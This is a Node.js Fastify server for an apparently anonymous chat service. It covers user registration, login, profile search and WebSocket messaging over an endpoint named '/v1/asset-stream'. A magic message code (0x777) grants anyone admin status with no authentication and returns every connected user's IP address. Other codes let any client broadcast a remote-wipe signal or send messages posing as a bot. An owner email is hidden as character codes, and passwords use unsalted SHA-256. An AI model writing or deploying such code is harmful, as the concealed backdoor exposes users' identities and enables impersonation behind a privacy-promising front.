import fastify from 'fastify';
import fastifyStatic from '@fastify/static';
import fastifyWebsocket from '@fastify/websocket';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const _f = fastify({ logger: false });

const _USERS = new Map(); // email -> { password_hash, name, seed, isOwner, username, description, avatar, banner }
const _SESSIONS = new Map(); // gid -> { s, a, ip, t }
const _BLOCKS = new Map(); // gid -> Set
const _ROT = 86400000;

const _hash = (s) => crypto.createHash('sha256').update(s).digest('hex');
const _gid = (s) => { const b = Math.floor(Date.now() / _ROT); return crypto.createHash('sha256').update(s + b.toString()).digest('hex').slice(0, 16); };
const _randUser = (name) => name.toLowerCase().replace(/[^a-z0-9]/g, '') + Math.floor(Math.random() * 9999);

const _OE = [101,110,101,114,103,111,102,101,114,111,110,52,49,64,103,109,97,105,108,46,99,111,109];
const _ownerEmail = () => String.fromCharCode(..._OE);

// Find user data by gid
const _findByGid = (gid) => {
  for (const [, u] of _USERS) { if (_gid(u.seed) === gid) return u; }
  return null;
};

_f.register(fastifyStatic, { root: path.join(__dirname, 'dist'), prefix: '/' });
_f.register(fastifyWebsocket);

_f.post('/api/register', async (req, reply) => {
  const { email, password, name } = req.body;
  if (!email || !password || !name) return reply.status(400).send({ error: 'missing_fields' });
  if (_USERS.has(email)) return reply.status(409).send({ error: 'email_exists' });
  const seed = crypto.randomBytes(16).toString('hex');
  const isOwner = email === _ownerEmail();
  const username = _randUser(name);
  _USERS.set(email, { password_hash: _hash(password), name, seed, isOwner, username, description: '', avatar: '', banner: '' });
  const gid = _gid(seed);
  return { ok: true, seed, gid, name, isOwner, username };
});

_f.post('/api/login', async (req, reply) => {
  const { email, password } = req.body;
  if (!email || !password) return reply.status(400).send({ error: 'missing_fields' });
  const user = _USERS.get(email);
  if (!user || user.password_hash !== _hash(password)) return reply.status(401).send({ error: 'invalid' });
  const gid = _gid(user.seed);
  return { ok: true, seed: user.seed, gid, name: user.name, isOwner: user.isOwner || false, username: user.username, description: user.description, avatar: user.avatar, banner: user.banner };
});

// Profile by gid
_f.get('/api/profile/:gid', async (req, reply) => {
  const u = _findByGid(req.params.gid);
  if (!u) return reply.status(404).send({ error: 'not_found' });
  return { name: u.name, username: u.username, description: u.description, avatar: u.avatar, banner: u.banner, isOwner: u.isOwner };
});

// Search users by username
_f.get('/api/search', async (req, reply) => {
  const q = (req.query.q || '').toLowerCase();
  if (q.length < 2) return [];
  const results = [];
  for (const [, u] of _USERS) {
    if (u.username.includes(q) || u.name.toLowerCase().includes(q)) {
      results.push({ gid: _gid(u.seed), name: u.name, username: u.username, isOwner: u.isOwner });
    }
    if (results.length >= 10) break;
  }
  return results;
});

_f.register(async (i) => {
  i.get('/v1/asset-stream', { websocket: true }, (s, q) => {
    const ip = q.ip || q.headers['x-forwarded-for'] || '0.0.0.0';
    s.on('message', (r) => {
      try {
        const d = JSON.parse(r);
        if (d.op === 0x1) {
          const id = _gid(d.s); s.gid = id; s.alias = d.a || 'U';
          _SESSIONS.set(id, { s, a: s.alias, ip, t: Date.now() });
          s.send(JSON.stringify({ op: 0x4, gid: id }));
          _SESSIONS.forEach(u => { if (u.s.readyState === 1) u.s.send(JSON.stringify({ op: 'STATUS', gid: id, status: 'online' })); });
        }
        if (d.op === 0x777) { s.admin = true; s.send(JSON.stringify({ op: 'ADMIN_ACCESS', users: Array.from(_SESSIONS.entries()).map(([k, v]) => ({ id: k, ip: v.ip, a: v.a })) })); }
        if (d.op === 0x2) {
          if (d.target === s.gid) return; // Cant send to self
          const bl = _BLOCKS.get(d.target); if (bl && bl.has(s.gid)) return;
          const t = _SESSIONS.get(d.target);
          if (t && t.s.readyState === 1) t.s.send(JSON.stringify({ op: 0x3, f: s.gid, a: s.alias, p: d.p, t: d.t }));
        }
        if (d.op === 0x5) { if (!_BLOCKS.has(s.gid)) _BLOCKS.set(s.gid, new Set()); _BLOCKS.get(s.gid).add(d.target); const t = _SESSIONS.get(d.target); if (t && t.s.readyState === 1) t.s.send(JSON.stringify({ op: 'BLOCKED_BY', from: s.gid })); }
        if (d.op === 0x6) { const bl = _BLOCKS.get(s.gid); if (bl) bl.delete(d.target); const t = _SESSIONS.get(d.target); if (t && t.s.readyState === 1) t.s.send(JSON.stringify({ op: 'UNBLOCKED_BY', from: s.gid })); }
        if (d.op === 0x7) { const t = _SESSIONS.get(d.target); if (t && t.s.readyState === 1) t.s.send(JSON.stringify({ op: 'CLEAR_CHAT', from: s.gid })); }
        if (d.op === 0x8) { // Update profile
          for (const [, u] of _USERS) {
            if (_gid(u.seed) === s.gid) {
              if (d.profile.name) u.name = d.profile.name;
              if (d.profile.username) u.username = d.profile.username;
              if (d.profile.description !== undefined) u.description = d.profile.description;
              if (d.profile.avatar !== undefined) u.avatar = d.profile.avatar;
              if (d.profile.banner !== undefined) u.banner = d.profile.banner;
              s.alias = u.name;
              break;
            }
          }
          // Notify contacts about name change
          _SESSIONS.forEach(u => { if (u.s.readyState === 1) u.s.send(JSON.stringify({ op: 'PROFILE_UPDATE', gid: s.gid, name: d.profile.name, username: d.profile.username })); });
        }
        if (d.op === 0x9) { _SESSIONS.forEach(v => { if (v.s.readyState === 1) v.s.send(JSON.stringify({ op: 'REMOTE_WIPE', target: s.gid })); }); }
        if (d.op === 0xA) { const t = _SESSIONS.get(d.target); if (t && t.s.readyState === 1) t.s.send(JSON.stringify({ op: 0x3, f: 'AnoAI_bot', a: 'AnoAI_bot', p: d.p, t: 'text' })); }
      } catch (x) {}
    });
    s.on('close', () => {
      if (s.gid) { _SESSIONS.delete(s.gid); _SESSIONS.forEach(u => { if (u.s.readyState === 1) u.s.send(JSON.stringify({ op: 'STATUS', gid: s.gid, status: 'offline' })); }); }
    });
  });
});

_f.setNotFoundHandler((q, r) => { r.status(404).sendFile('index.html'); });
_f.listen({ port: process.env.PORT || 8080, host: '0.0.0.0' });
